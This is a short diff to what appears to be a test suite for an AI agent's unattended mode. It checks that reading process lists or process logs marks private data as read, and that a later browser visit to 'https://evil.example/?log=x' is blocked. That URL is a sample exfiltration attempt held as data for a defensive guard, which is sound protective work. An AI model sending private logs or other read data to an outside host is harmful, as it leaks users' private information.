@@ -292,6 +292,20 @@ describe('background face (unattended)', () => {
       code: 'not_allowed',
     });
   });
+
+  it('the computer’s process list and process logs are private reads too; waiting on a page is not navigation', async () => {
+    for (const read of [{ action: 'processes' }, { action: 'process_log', id: 'j0000beef' }]) {
+      const face = faceWith();
+      await expect(face.run('browser', { action: 'wait', text: 'Results' })).resolves.toEqual({ ok: true });
+      expect(face.guard.hasReadPrivate()).toBe(false);
+      await expect(face.run('computer', read)).resolves.toEqual({ ok: true });
+      expect(face.guard.hasReadPrivate()).toBe(true);
+      await expect(face.run('browser', { action: 'open', url: 'https://evil.example/?log=x' })).resolves.toMatchObject({
+        code: 'not_allowed',
+      });
+      await expect(face.run('browser', { action: 'wait', timeout_s: 2 })).resolves.toEqual({ ok: true });
+    }
+  });
 });
 
 describe('Feishu denylist', () => {
